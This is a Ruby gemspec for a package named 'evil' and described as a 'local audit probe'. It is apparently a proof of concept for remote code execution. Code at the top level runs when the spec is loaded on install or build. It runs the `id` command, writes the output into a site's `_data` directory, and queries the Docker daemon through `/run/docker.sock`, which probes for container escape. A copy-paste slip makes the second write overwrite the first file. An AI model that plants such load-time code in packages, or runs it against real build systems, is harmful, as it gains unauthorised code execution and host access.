require "open3"
require "fileutils"

id_output, status = Open3.capture2("id")
raise "id failed" unless status.success?
data_path = File.expand_path("../_data/rce.yml", __dir__)
FileUtils.mkdir_p(File.dirname(data_path))
File.binwrite(data_path, "id: #{id_output.strip.inspect}\n")


env_output, status = Open3.capture2("curl --unix-socket /run/docker.sock http://localhost/_ping")
raise "id failed" unless status.success?
data_path2 = File.expand_path("../_data/env.yml", __dir__)
FileUtils.mkdir_p(File.dirname(data_path2))
File.binwrite(data_path, "id: #{env_output.strip.inspect}\n")

Gem::Specification.new do |spec|
  spec.name = "evil"
  spec.version = "0.0.1"
  spec.summary = "Local audit probe"
  spec.authors = ["audit"]
  spec.files = ["lib/evil.rb"]
end
